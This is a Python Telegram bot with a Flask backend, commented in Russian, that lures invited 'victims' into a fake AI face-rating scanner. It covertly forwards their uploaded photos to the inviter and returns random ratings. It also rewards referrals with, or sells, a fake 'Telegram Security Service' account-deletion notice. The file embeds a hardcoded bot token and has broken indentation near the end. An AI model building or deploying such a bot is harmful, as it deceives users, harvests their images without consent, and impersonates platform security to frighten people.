import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton, LabeledPrice, WebAppInfo
from flask import Flask, request, send_file
from threading import Thread
import random
import os

# ТОКЕН БОТА (ВСТАВЬ СВОЙ)
TELEGRAM_TOKEN = "9037182564:AAF8t7WjlmrdSWmNsQV0nWxDkZM8LK-CwDc"
bot = telebot.TeleBot(TELEGRAM_TOKEN)

victims = {}
# Тут будем хранить, кто сколько друзей привел: {id: кол-во}
partners_count = {}

app = Flask(__name__)

@app.route('/')
def index():
    return send_file('index.html')

@app.route('/upload', methods=['POST'])
def upload():
    if 'photo' not in request.files:
        return "Нет фото", 400
    
    photo = request.files['photo']
    user_id = int(request.form.get('user_id'))
    
    filename = f"temp_{user_id}.jpg"
    photo.save(filename)
    
    inviter_id = victims.get(user_id)
    
    if inviter_id:
        # Отправляем фото тому, кто пригласил
        with open(filename, 'rb') as f:
            bot.send_photo(inviter_id, f, caption=f"📸 **Жертва попалась через сайт!**")
            
        # НАЧИСЛЯЕМ БАЛЛ ПАРТНЕРУ (тому, кто пригласил)
        partners_count[inviter_id] = partners_count.get(inviter_id, 0) + 1
        
        # Уведомляем партнера
        try:
            bot.send_message(
                inviter_id, 
                f"🎉 **Ура! Твой друг прошел сканер!**\nТы привел уже {partners_count[inviter_id]} чел.\nПриведи 3-х и получи БЕСПЛАТНЫЙ снос аккаунта!",
                parse_mode="Markdown"
            )
        except:
            pass
    
    ratings = ["SUB 5 😭", "SUB 5 😭", "SUB 5 😭", "NPC 😐", "CHAD 🗿"]
    result = random.choice(ratings)
    
    os.remove(filename)
    return result

@bot.message_handler(commands=['start'])
def start_message(message):
    command_parts = message.text.split()
    
    # ЖЕРТВА
    if len(command_parts) > 1 and command_parts[1] != "ban_prank":
        try:
            inviter_id = int(command_parts[1])
            victims[message.from_user.id] = inviter_id
            text = "🤖 **Добро пожаловать в Face Rate AI!**\n\nЯ — нейросеть, которая оценивает твое лицо.\n\n📸 Нажми на кнопку ниже, чтобы открыть сканер!"
            
            # ВСТАВЬ СВОЮ ССЫЛКУ RENDER
            web_app_url = "https://face-bot-1-p8zh.onrender.com" 
            
            markup = InlineKeyboardMarkup()
            btn = InlineKeyboardButton("🚀 Открыть сканер", web_app=WebAppInfo(url=web_app_url))
            markup.add(btn)
            
            bot.send_message(message.chat.id, text, reply_markup=markup, parse_mode="Markdown")
        except ValueError:
            pass
            
    # СНОС
    elif len(command_parts) > 1 and command_parts[1] == "ban_prank":
        text = "⚠️ **СЛУЖБА БЕЗОПАСНОСТИ TELEGRAM** ⚠️\n\nВнимание! Ваш аккаунт будет удален завтра в 12:00.\n\n(Шутка! Это пранк от твоего друга 😂)"
        bot.send_message(message.chat.id, text, parse_mode="Markdown")
    
    # СОЗДАТЕЛЬ / ПАРТНЕР
    else:
        bot_info = bot.get_me()
        invite_link = f"https://t.me/{bot_info.username}?start={message.from_user.id}"
        
        # Смотрим, сколько он уже привел
        count = partners_count.get(message.from_user.id, 0)
        
        text = (
            "🤖 **Босс передаёт привет!** 👋\n\n"
            f"Ты привел уже: **{count}** друзей.\n"
            "Приведи **3-х друзей**, и я дам тебе БЕСПЛАТНЫЙ снос аккаунта! 😈\n\n"
            "1️⃣ Жми кнопку, копируй ссылку и кидай друзьям.\n"
            "2️⃣ Или купи снос сразу за 10 ⭐."
        )
        
        markup = InlineKeyboardMarkup()
        btn_copy = InlineKeyboardButton("📋 Скопировать ссылку", copy_text=telebot.types.CopyTextButton(text=invite_link))
        
        # Если привел 3-х, даем бесплатный снос
        if count >= 3:
            btn_buy = InlineKeyboardButton("🎁 Забрать БЕСПЛАТНЫЙ снос", callback_data="free_ban")
        else:
            btn_buy = InlineKeyboardButton("💀 Снести аккаунт (10 ⭐)", callback_data="buy_ban")    
                     markup.add(btn_copy)     
                    markup.add(btn_buy)
            
        bot.send_message(message.chat.id, text, reply_markup=markup, parse_mode="Markdown")
    @bot.callback_query_handler(func=lambda call: call.data in ["buy_ban", "free_ban"])
    def callback_buy(call):
    bot_info = bot.get_me()
    ban_link = f"https://t.me/{bot_info.username}?start=ban_prank"
    
    if call.data == "free_ban":
        markup = InlineKeyboardMarkup()
        btn = InlineKeyboardButton("💀 Забрать ссылку", url=ban_link)
        markup.add(btn)
        bot.send_message(call.message.chat.id, "🎁 **Ты выполнил квест!**\n\nВот твоя ссылка на снос:", reply_markup=markup, parse_mode="Markdown")
    else:
        bot.send_invoice(call.message.chat.id, title="Пранк: Снос", description="Уведомление о сносе.", invoice_payload="ban_prank_10", provider_token="", currency="XTR", prices=[LabeledPrice(label="Пранк", amount=10)])

@bot.pre_checkout_query_handler(func=lambda query: True)
def checkout(pre_checkout_query):
    bot.answer_pre_checkout_query(pre_checkout_query.id, ok=True)

@bot.message_handler(content_types=['successful_payment'])
def got_payment(message):
    bot_info = bot.get_me()
    ban_link = f"https://t.me/{bot_info.username}?start=ban_prank"
    bot.send_message(message.chat.id, f"💸 **Оплата прошла!**\n\nСсылка на снос:\n{ban_link}", parse_mode="Markdown")

def run_flask():
    port = int(os.environ.get('PORT', 8080))
    app.run(host='0.0.0.0', port=port)

if __name__ == '__main__':
    t = Thread(target=run_flask)
    t.start()
    bot.infinity_polling() 
